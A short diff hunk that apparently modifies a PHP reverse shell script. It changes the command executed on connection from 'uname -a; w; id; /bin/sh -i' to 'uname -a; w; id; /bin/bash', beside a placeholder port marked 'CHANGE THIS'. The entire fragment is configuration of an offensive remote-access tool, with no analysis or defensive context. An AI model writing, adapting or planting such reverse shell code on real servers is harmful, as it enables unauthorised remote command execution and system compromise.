@@ -51,7 +51,7 @@ $port = 1234;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
+$shell = 'uname -a; w; id; /bin/bash';
 $daemon = 0;
 $debug = 0;
 
